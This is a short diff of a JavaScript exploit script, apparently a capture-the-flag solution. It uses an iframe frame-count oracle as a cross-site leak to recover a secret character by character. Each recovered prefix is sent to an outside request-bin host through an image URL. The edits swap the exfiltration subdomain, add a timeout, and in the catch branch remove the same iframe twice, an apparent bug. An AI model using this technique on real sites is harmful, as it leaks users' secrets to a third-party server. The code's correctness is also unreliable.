@@ -10,12 +10,20 @@
             iframe.onload = () => {
                 try{
                     result = iframe.contentWindow.frames.length;
+                    document.body.removeChild(iframe);
                     resolve(result > 0);
                 }
                 catch(e){
-                    reject(e);
+                    document.body.removeChild(iframe);
+                    document.body.removeChild(iframe);
+                    resolve(false);
                 }
             };
+
+            setTimeout(() => {
+                document.body.removeChild(iframe);
+                resolve(false);
+            }, 1000); // 1초 타임아웃 설정
         });
     }
 
@@ -33,7 +41,7 @@
                 if(rslt.success){
                     secret += rslt.char;
                     found = true;
-                    img.src = `https://sqkyiuu.request.dreamhack.games/${secret}`;
+                    img.src = `https://sypkhxt.request.dreamhack.games/${secret}`;
                     break;
                 }
             }
